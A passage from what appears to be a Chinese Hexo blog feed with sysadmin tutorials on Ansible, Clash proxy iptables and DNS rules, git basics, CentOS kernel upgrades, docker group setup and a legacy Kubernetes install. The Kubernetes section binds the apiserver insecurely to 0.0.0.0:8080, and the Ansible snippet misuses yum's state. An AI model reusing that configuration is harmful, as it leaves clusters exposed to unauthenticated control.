class="hljs-bullet">-</span> <span class="hljs-attr">hosts:</span> <span class="hljs-string">mycentos</span><br>  <span class="hljs-attr">remote_user:</span> <span class="hljs-string">root</span><br>  <span class="hljs-attr">tasks:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">copyfile</span> <span class="hljs-string">to</span> <span class="hljs-string">des</span> <span class="hljs-string">server</span><br>    <span class="hljs-attr">copy:</span> <span class="hljs-string">src=/root/shell.sh</span> <span class="hljs-string">dst=/tmp/shell.sh</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">install</span> <span class="hljs-string">tool</span><br>    <span class="hljs-attr">yum:</span> <span class="hljs-string">name=nginx</span> <span class="hljs-string">state=restarted</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">start</span> <span class="hljs-string">service</span><br>    <span class="hljs-attr">service:</span> <span class="hljs-string">name=nginx</span> <span class="hljs-string">state=started</span> <span class="hljs-string">enable=true</span><br>  <span class="hljs-attr">handlers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">restart</span> <span class="hljs-string">nginx</span><br>    <span class="hljs-attr">service:</span> <span class="hljs-string">name=nginx</span> <span class="hljs-string">state=restarted</span><br></code></pre></td></tr></table></figure><p>参考:</p><p><a href="https://juejin.cn/post/6844903631066513421">https://juejin.cn/post/6844903631066513421</a></p>]]></content>
    
    
    <categories>
      
      <category>linux运维</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件配置及软件原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>clash配置</title>
    <link href="/2022/07/27/clash%E9%85%8D%E7%BD%AE/"/>
    <url>/2022/07/27/clash%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="clash配置"><a href="#clash配置" class="headerlink" title="clash配置"></a>clash配置</h1><h3 id="1-clash配置透明代理"><a href="#1-clash配置透明代理" class="headerlink" title="1.clash配置透明代理"></a>1.clash配置透明代理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">iptables -t nat -N CLASH_TCP_RULE<br><span class="hljs-comment">#创建新的规则链</span><br>iptables -t nat -A PREROUTING -p tcp -j CLASH_TCP_RULE<br>iptables -t nat -A CLASH -p tcp -d 192.168.0.0/16 -j RETURN<br><span class="hljs-comment">#不对局域网地址进行转发</span><br>iptables -t nat -A CLASH_TCP_RULE -p tcp -j REDIRECT --to-ports 1082(此为clash配置的透明代理端口)<br></code></pre></td></tr></table></figure><h2 id="2-clash配置dns加密代理"><a href="#2-clash配置dns加密代理" class="headerlink" title="2.clash配置dns加密代理"></a>2.clash配置dns加密代理</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">dns:</span><br>  <span class="hljs-attr">enable:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">listen:</span> <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">:55</span><br>  <span class="hljs-comment">#clash dns监听的地址和端口(按实际需求进行更改)</span><br>  <span class="hljs-attr">default-nameserver:</span><br>  <span class="hljs-comment">#默认的bootstrap dns服务器(用于解析实际dns服务器的ip地址)</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-number">119.29</span><span class="hljs-number">.29</span><span class="hljs-number">.29</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-number">223.5</span><span class="hljs-number">.5</span><span class="hljs-number">.5</span><br>  <span class="hljs-attr">nameserver:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://doh.pub/dns-query</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://dns.alidns.com/dns-query</span><br>  <span class="hljs-attr">fallback:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://1.1.1.1/dns-query</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">https://dns.google.com/dns-query</span><br>  <span class="hljs-attr">fallback-filter:</span><br>    <span class="hljs-attr">geoip:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-attr">geoip-code:</span> <span class="hljs-string">CN</span><br>    <span class="hljs-attr">ipcidr:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-number">240.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><span class="hljs-string">/4</span><br></code></pre></td></tr></table></figure><h2 id="3-配置dns广告过滤以及dns加密"><a href="#3-配置dns广告过滤以及dns加密" class="headerlink" title="3.配置dns广告过滤以及dns加密"></a>3.配置dns广告过滤以及dns加密</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#54端口自行配置AdGuard_Home</span><br>iptables -t nat -A PREROUTING -p udp --dport 53 -j REDIRECT --to-ports 54 <span class="hljs-comment">#将目标端口为53的流量重定向到本机54端口,54端口为AdGuard_Home</span><br>iptables -t nat -A OUTPUT -p udp --dport 53 -j REDIRECT --to-ports 55 <span class="hljs-comment">#将目标端口为53的流量重定向到本机的55端口,55端口为clash dns</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>软件和系统配置</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git使用入门</title>
    <link href="/2022/07/20/git%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/"/>
    <url>/2022/07/20/git%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="Git使用入门"><a href="#Git使用入门" class="headerlink" title="Git使用入门"></a>Git使用入门</h1><h3 id="1-git是什么"><a href="#1-git是什么" class="headerlink" title="1.git是什么?"></a>1.git是什么?</h3><p>git是一个强大的分布式版本控制工具,可以处理项目的版本管理,最初为了方便管理linux的内核版本控制而开发</p><h3 id="2-git的三个工作区"><a href="#2-git的三个工作区" class="headerlink" title="2.git的三个工作区"></a>2.git的三个工作区</h3><p>1.工作区(workspace)</p><p>当前所在的工作区域,编辑过的文件如果没有通过git add加入到暂存区,这些文件都存储在工作区</p><p>2.暂存区(Index&#x2F;Stage)</p><p>通过git add 可将文件从工作去加入到暂存区</p><p>3.版本库(Repository)</p><p>通过git commit 可以将暂存区的代码从暂存区加入到版本库</p><h3 id="3-git分支"><a href="#3-git分支" class="headerlink" title="3.git分支"></a>3.git分支</h3><p>git分支支持从一个当前分支创建一个新的分支,以便于开发不影响主线代码</p><h3 id="4-git常用命令"><a href="#4-git常用命令" class="headerlink" title="4.git常用命令"></a>4.git常用命令</h3><h5 id="4-1-git初始化操作"><a href="#4-1-git初始化操作" class="headerlink" title="4.1.git初始化操作"></a>4.1.git初始化操作</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git config --global user.name <span class="hljs-variable">$&#123;USERNAME&#125;</span><span class="hljs-comment">#配置用户名</span><br>git config --global user.email <span class="hljs-variable">$&#123;email&#125;</span><span class="hljs-comment">#配置用户的邮件地址</span><br><span class="hljs-comment">#--global 表示全局配置</span><br></code></pre></td></tr></table></figure><h5 id="4-2-git代码提交命令"><a href="#4-2-git代码提交命令" class="headerlink" title="4.2.git代码提交命令"></a>4.2.git代码提交命令</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#将代码从工作区加入暂存区</span><br>git add .<br><br><span class="hljs-comment">#提交代码到版本库</span><br>git commit -m <span class="hljs-string">&quot;update code&quot;</span><br><br><br><span class="hljs-comment">#查看提交历史</span><br>git <span class="hljs-built_in">log</span><br><br></code></pre></td></tr></table></figure><h5 id="4-3-git版本回退"><a href="#4-3-git版本回退" class="headerlink" title="4.3.git版本回退"></a>4.3.git版本回退</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git reset --hard <span class="hljs-built_in">id</span><span class="hljs-comment">#舍弃当前版本,回退到之前的版本,</span><br>git reset --soft <span class="hljs-built_in">id</span><span class="hljs-comment">#撤销当前版本提交,回退到之前版本,之前版本到现在版本的代码会被重新放到暂存区</span><br>git reset --mixed <span class="hljs-built_in">id</span><span class="hljs-comment">#撤销当前版本提交,之前版本到现在版本变化的代码会被重新放到工作区</span><br></code></pre></td></tr></table></figure><h5 id="4-4-git分支操作"><a href="#4-4-git分支操作" class="headerlink" title="4.4.git分支操作"></a>4.4.git分支操作</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">git branch <span class="hljs-variable">$&#123;BARNCH_NAME&#125;</span><span class="hljs-comment">#创建分支</span><br>git branch -d <span class="hljs-variable">$&#123;BRANCH_NAME&#125;</span> <span class="hljs-comment">#删除分支</span><br>git checkout <span class="hljs-variable">$&#123;BRANCH_NAME&#125;</span><span class="hljs-comment">#切换分支</span><br>git checkout -b <span class="hljs-variable">$&#123;BRANCH_NAME&#125;</span> <span class="hljs-comment">#创建并切换分支</span><br>git merge <span class="hljs-variable">$&#123;BRANCH_NAME&#125;</span> <span class="hljs-comment">#合并分支到当前分支</span><br></code></pre></td></tr></table></figure><h5 id="5-git远程分支操作"><a href="#5-git远程分支操作" class="headerlink" title="5.git远程分支操作"></a>5.git远程分支操作</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> <span class="hljs-variable">$&#123;URL&#125;</span><span class="hljs-comment">#克隆一个远程仓库</span><br>git remote -v <span class="hljs-comment">#查看当前远程信息</span><br>git pull origin master:master <span class="hljs-comment">#同步本地仓库,相当于克隆远程分支,将远程分支合并到本地分支，第一个为远程分支,第二个为本地分支</span><br>git push -u origin master:master <span class="hljs-comment">#将本地版本库推送至远程仓库origin的master分支,第一个为本地分支,第二个为远程分支</span><br>git push origin master:master<span class="hljs-comment">#将本地分支master推送至远程分支master</span><br>git push origin --delete <span class="hljs-variable">$&#123;BRANCH_NAME&#125;</span><span class="hljs-comment">#删除一个远程分支</span><br>git remote add origin <span class="hljs-variable">$&#123;URL&#125;</span><span class="hljs-comment">#添加一个远程仓库地址</span><br>git remote --set-url origin <span class="hljs-variable">$&#123;URL&#125;</span><span class="hljs-comment">#修改远程仓库地址</span><br></code></pre></td></tr></table></figure><h5 id="6-git标签"><a href="#6-git标签" class="headerlink" title="6.git标签"></a>6.git标签</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 列出所有tag</span><br>$ git tag<br><br><span class="hljs-comment"># 新建一个tag在当前commit</span><br>$ git tag [tag]<br><br><span class="hljs-comment"># 新建一个tag在指定commit</span><br>$ git tag [tag] [commit]<br><br><span class="hljs-comment"># 删除本地tag</span><br>$ git tag -d [tag]<br><br><span class="hljs-comment"># 删除远程tag</span><br>$ git push origin :refs/tags/[tagName]<br><br><span class="hljs-comment"># 查看tag信息</span><br>$ git show [tag]<br><br><span class="hljs-comment"># 提交指定tag</span><br>$ git push [remote] [tag]<br><br><span class="hljs-comment"># 提交所有tag</span><br>$ git push [remote] --tags<br><br><span class="hljs-comment"># 新建一个分支，指向某个tag</span><br>$ git checkout -b [branch] [tag]<br></code></pre></td></tr></table></figure><h5 id="7-git变基"><a href="#7-git变基" class="headerlink" title="7.git变基"></a>7.git变基</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git rebase -i <span class="hljs-built_in">id</span> <span class="hljs-comment">#合并提交记录</span><br><br></code></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>git是一个开源的非常强大的分布式版本控制工具,常用于企业开发管理项目,对于团队协作开发项目十分的方便。</p>]]></content>
    
    
    <categories>
      
      <category>linux运维</category>
      
    </categories>
    
    
    <tags>
      
      <tag>常用的开发工具使用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>centos更换内核</title>
    <link href="/2022/07/12/centos%E6%9B%B4%E6%8D%A2%E5%86%85%E6%A0%B8/"/>
    <url>/2022/07/12/centos%E6%9B%B4%E6%8D%A2%E5%86%85%E6%A0%B8/</url>
    
    <content type="html"><![CDATA[<h1 id="centos更换内核"><a href="#centos更换内核" class="headerlink" title="centos更换内核"></a>centos更换内核</h1><p>导入仓库索引密钥并下载仓库索引</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">rpm --import https://www.elrepo.org/RPM-GPG-KEY-elrepo.org<br> <br>rpm -Uvh http://www.elrepo.org/elrepo-release-7.0-2.el7.elrepo.noarch.rpm<br></code></pre></td></tr></table></figure><p>查找可用的linux内核</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum --disablerepo=<span class="hljs-string">&quot;*&quot;</span> --enablerepo=<span class="hljs-string">&quot;elrepo-kernel&quot;</span> list available<br></code></pre></td></tr></table></figure><p>安装最新版本的主线内核</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum --enablerepo=elrepo-kernel install kernel-ml<br></code></pre></td></tr></table></figure><p>重新生成grub配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">grub2-mkconfig -o /boot/grub2/grub.cfg<br></code></pre></td></tr></table></figure><p>设置默认的启动内核</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /boot/grub2/grub.cfg |grep menuentry<span class="hljs-comment">#查找可用的grub配置菜单参数</span><br>grub2-set-default <span class="hljs-string">&#x27;CentOS Linux (4.17.4-1.el7.elrepo.x86_64) 7 (Core)&#x27;</span><span class="hljs-comment">#设置默认的启动内核版本</span><br></code></pre></td></tr></table></figure><p>参考:<a href="https://blog.csdn.net/qq_38591756/article/details/82829398">https://blog.csdn.net/qq_38591756/article/details/82829398</a></p>]]></content>
    
    
    <categories>
      
      <category>软件和系统配置</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker配置非root用户使用</title>
    <link href="/2022/07/12/docker%E9%85%8D%E7%BD%AE%E9%9D%9Eroot%E7%94%A8%E6%88%B7%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/07/12/docker%E9%85%8D%E7%BD%AE%E9%9D%9Eroot%E7%94%A8%E6%88%B7%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="docker配置非root用户使用"><a href="#docker配置非root用户使用" class="headerlink" title="docker配置非root用户使用"></a>docker配置非root用户使用</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">groupadd docker<br>usermod -aG docker <span class="hljs-variable">$&#123;USER&#125;</span><span class="hljs-comment">#</span><br><span class="hljs-comment">#重新登陆系统生效</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>软件配置</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>kubernetes简单入门</title>
    <link href="/2022/07/12/kubernetes%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8/"/>
    <url>/2022/07/12/kubernetes%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="kubernetes简单入门"><a href="#kubernetes简单入门" class="headerlink" title="kubernetes简单入门"></a>kubernetes简单入门</h1><h2 id="1-kubernetes是什么"><a href="#1-kubernetes是什么" class="headerlink" title="1.kubernetes是什么?"></a>1.kubernetes是什么?</h2><p>Kubernetes 是一个可移植、可扩展的开源平台，用于管理容器化的工作负载和服务，可促进声明式配置和自动化。 Kubernetes 拥有一个庞大且快速增长的生态，其服务、支持和工具的使用范围相当广泛。</p><p><strong>Kubernetes</strong> 这个名字源于希腊语，意为“舵手”或“飞行员”。k8s 这个缩写是因为 k 和 s 之间有八个字符的关系。 Google 在 2014 年开源了 Kubernetes 项目。 Kubernetes 建立在<a href="https://research.google/pubs/pub43438">Google 大规模运行生产工作负载十几年经验</a>的基础上， 结合了社区中最优秀的想法和实践。</p><h2 id="2-kubernetes组件"><a href="#2-kubernetes组件" class="headerlink" title="2.kubernetes组件"></a>2.kubernetes组件</h2><h3 id="2-1-控制平面组件（Control-Plane-Components"><a href="#2-1-控制平面组件（Control-Plane-Components" class="headerlink" title="2.1.控制平面组件（Control Plane Components)"></a>2.1.控制平面组件（Control Plane Components)</h3><h5 id="2-1-1-kube-apiserver"><a href="#2-1-1-kube-apiserver" class="headerlink" title="2.1.1.kube-apiserver"></a>2.1.1.kube-apiserver</h5><p>API 服务器是 Kubernetes <a href="https://kubernetes.io/zh-cn/docs/reference/glossary/?all=true#term-control-plane">控制平面</a>的组件， 该组件负责公开了 Kubernetes API，负责处理接受请求的工作。 API 服务器是 Kubernetes 控制平面的前端。</p><p>Kubernetes API 服务器的主要实现是 <a href="https://kubernetes.io/zh-cn/docs/reference/command-line-tools-reference/kube-apiserver/">kube-apiserver</a>。 <code>kube-apiserver</code> 设计上考虑了水平扩缩，也就是说，它可通过部署多个实例来进行扩缩。 你可以运行 <code>kube-apiserver</code> 的多个实例，并在这些实例之间平衡流量。</p><h5 id="2-1-2-kube-scheduler"><a href="#2-1-2-kube-scheduler" class="headerlink" title="2.1.2.kube-scheduler"></a>2.1.2.kube-scheduler</h5><p><code>kube-scheduler</code> 是<a href="https://kubernetes.io/zh-cn/docs/reference/glossary/?all=true#term-control-plane">控制平面</a>的组件， 负责监视新创建的、未指定运行<a href="https://kubernetes.io/zh-cn/docs/concepts/architecture/nodes/">节点（node）</a>的 <a href="https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/">Pods</a>， 并选择节点来让 Pod 在上面运行。</p><p>调度决策考虑的因素包括单个 Pod 及 Pods 集合的资源需求、软硬件及策略约束、 亲和性及反亲和性规范、数据位置、工作负载间的干扰及最后时限。</p><h5 id="2-1-3-kube-controller-manager"><a href="#2-1-3-kube-controller-manager" class="headerlink" title="2.1.3.kube-controller-manager"></a>2.1.3.kube-controller-manager</h5><p><a href="https://kubernetes.io/zh-cn/docs/reference/command-line-tools-reference/kube-controller-manager/">kube-controller-manager</a> 是<a href="https://kubernetes.io/zh-cn/docs/reference/glossary/?all=true#term-control-plane">控制平面</a>的组件， 负责运行<a href="https://kubernetes.io/zh-cn/docs/concepts/architecture/controller/">控制器</a>进程。</p><p>从逻辑上讲， 每个<a href="https://kubernetes.io/zh-cn/docs/concepts/architecture/controller/">控制器</a>都是一个单独的进程， 但是为了降低复杂性，它们都被编译到同一个可执行文件，并在同一个进程中运行。</p><p>这些控制器包括：</p><ul><li>节点控制器（Node Controller）：负责在节点出现故障时进行通知和响应</li><li>任务控制器（Job Controller）：监测代表一次性任务的 Job 对象，然后创建 Pods 来运行这些任务直至完成</li><li>端点控制器（Endpoints Controller）：填充端点（Endpoints）对象（即加入 Service 与 Pod）</li><li>服务帐户和令牌控制器（Service Account &amp; Token Controllers）：为新的命名空间创建默认帐户和 API 访问令牌</li></ul><h5 id="2-1-4-cloud-controller-manager"><a href="#2-1-4-cloud-controller-manager" class="headerlink" title="2.1.4.cloud-controller-manager"></a>2.1.4.cloud-controller-manager</h5><p><code>cloud-controller-manager</code> 是指嵌入特定云的控制逻辑之 <a href="https://kubernetes.io/zh-cn/docs/reference/glossary/?all=true#term-control-plane">控制平面</a>组件。 <code>cloud-controller-manager</code> 允许你将你的集群连接到云提供商的 API 之上， 并将与该云平台交互的组件同与你的集群交互的组件分离开来。</p><p><code>cloud-controller-manager</code> 仅运行特定于云平台的控制器。 因此如果你在自己的环境中运行 Kubernetes，或者在本地计算机中运行学习环境， 所部署的集群不需要有云控制器管理器。</p><p>与 <code>kube-controller-manager</code> 类似，<code>cloud-controller-manager</code> 将若干逻辑上独立的控制回路组合到同一个可执行文件中， 供你以同一进程的方式运行。 你可以对其执行水平扩容（运行不止一个副本）以提升性能或者增强容错能力。</p><p>下面的控制器都包含对云平台驱动的依赖：</p><ul><li>节点控制器（Node Controller）：用于在节点终止响应后检查云提供商以确定节点是否已被删除</li><li>路由控制器（Route Controller）：用于在底层云基础架构中设置路由</li><li>服务控制器（Service Controller）：用于创建、更新和删除云提供商负载均衡器</li></ul><h5 id="2-1-5-etcd"><a href="#2-1-5-etcd" class="headerlink" title="2.1.5.etcd"></a>2.1.5.etcd</h5><p><code>etcd</code> 是兼顾一致性与高可用性的键值数据库，可以作为保存 Kubernetes 所有集群数据的后台数据库。</p><p>你的 Kubernetes 集群的 <code>etcd</code> 数据库通常需要有个<a href="https://kubernetes.io/zh-cn/docs/tasks/administer-cluster/configure-upgrade-etcd/#backing-up-an-etcd-cluster">备份</a>计划。</p><p>如果想要更深入的了解 <code>etcd</code>，请参考 <a href="https://etcd.io/docs/">etcd 文档</a>。</p><h3 id="2-2-Node-组件"><a href="#2-2-Node-组件" class="headerlink" title="2.2.Node 组件"></a>2.2.Node 组件</h3><h5 id="2-2-1-kubelet"><a href="#2-2-1-kubelet" class="headerlink" title="2.2.1.kubelet"></a>2.2.1.kubelet</h5><p><code>kubelet</code> 会在集群中每个<a href="https://kubernetes.io/zh-cn/docs/concepts/architecture/nodes/">节点（node）</a>上运行。 它保证<a href="https://kubernetes.io/zh-cn/docs/concepts/overview/what-is-kubernetes/#why-containers">容器（containers）</a>都运行在 <a href="https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/">Pod</a> 中。</p><p>kubelet 接收一组通过各类机制提供给它的 PodSpecs， 确保这些 PodSpecs 中描述的容器处于运行状态且健康。 kubelet 不会管理不是由 Kubernetes 创建的容器。</p><h5 id="2-2-2-kube-proxy"><a href="#2-2-2-kube-proxy" class="headerlink" title="2.2.2.kube-proxy"></a>2.2.2.kube-proxy</h5><p><a href="https://kubernetes.io/zh-cn/docs/reference/command-line-tools-reference/kube-proxy/">kube-proxy</a> 是集群中每个<a href="https://kubernetes.io/zh-cn/docs/concepts/architecture/nodes/">节点（node）</a>所上运行的网络代理， 实现 Kubernetes <a href="https://kubernetes.io/zh-cn/docs/concepts/services-networking/service/">服务（Service）</a> 概念的一部分。</p><p>kube-proxy 维护节点上的一些网络规则， 这些网络规则会允许从集群内部或外部的网络会话与 Pod 进行网络通信。</p><p>如果操作系统提供了可用的数据包过滤层，则 kube-proxy 会通过它来实现网络规则。 否则，kube-proxy 仅做流量转发。</p><h2 id="3-kubernetes的安装与部署-基于Centos7-9"><a href="#3-kubernetes的安装与部署-基于Centos7-9" class="headerlink" title="3.kubernetes的安装与部署(基于Centos7.9)"></a>3.kubernetes的安装与部署(基于Centos7.9)</h2><h5 id="1-部署master节点"><a href="#1-部署master节点" class="headerlink" title="1.部署master节点"></a>1.部署master节点</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#安装master节点</span><br>yum install -y etcd<span class="hljs-comment">#键值对数据库</span><br>yum install -y kubernetes-master<br><br><span class="hljs-comment">#配置apiserver配置文件</span><br><span class="hljs-comment">#-------/etc/kubernetes/apiserver</span><br>KUBE_API_ADDRESS=<span class="hljs-string">&quot;--insecure-bind-address=0.0.0.0&quot;</span><br><br><span class="hljs-comment"># The port on the local server to listen on.</span><br>KUBE_API_PORT=<span class="hljs-string">&quot;--port=8080&quot;</span><br><br><span class="hljs-comment"># Port minions listen on</span><br>KUBELET_PORT=<span class="hljs-string">&quot;--kubelet-port=10250&quot;</span><br><br><span class="hljs-comment"># Comma separated list of nodes in the etcd cluster</span><br>KUBE_ETCD_SERVERS=<span class="hljs-string">&quot;--etcd-servers=http://127.0.0.1:2379&quot;</span><br><br><span class="hljs-comment"># Address range to use for services</span><br>KUBE_SERVICE_ADDRESSES=<span class="hljs-string">&quot;--service-cluster-ip-range=10.254.0.0/16&quot;</span><br><br><span class="hljs-comment"># default admission control policies</span><br>KUBE_ADMISSION_CONTROL=<span class="hljs-string">&quot;--admission-control=NamespaceLifecycle,NamespaceExists,LimitRanger,SecurityContextDeny,ServiceAccount,ResourceQuota&quot;</span><br><br><span class="hljs-comment"># Add your own!</span><br>KUBE_API_ARGS=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment">#配置/etc/kubernetes/config配置文件</span><br>KUBE_LOGTOSTDERR=<span class="hljs-string">&quot;--logtostderr=true&quot;</span><br><br><span class="hljs-comment"># journal message level, 0 is debug</span><br>KUBE_LOG_LEVEL=<span class="hljs-string">&quot;--v=0&quot;</span><br><br><span class="hljs-comment"># Should this cluster be allowed to run privileged docker containers</span><br>KUBE_ALLOW_PRIV=<span class="hljs-string">&quot;--allow-privileged=false&quot;</span><br><br><span class="hljs-comment"># How the controller-manager, scheduler, and proxy find the apiserver</span><br>KUBE_MASTER=<span class="hljs-string">&quot;--master=http://192.168.245.131:8080&quot;</span><br><br>systemctl start kube-apiserver.service<br>systemctl start kube-controller-manager.service<br>systemctl start kube-scheduler.service<br></code></pre></td></tr></table></figure><h5 id="2-部署node节点"><a href="#2-部署node节点" class="headerlink" title="2.部署node节点"></a>2.部署node节点</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum install -y kubernetes-node<br><span class="hljs-comment">#编辑配置文件 /etc/kubernetes/kubelet</span><br><span class="hljs-comment"># kubernetes kubelet (minion) config</span><br><br><span class="hljs-comment"># The address for the info server to serve on (set to 0.0.0.0 or &quot;&quot; for all 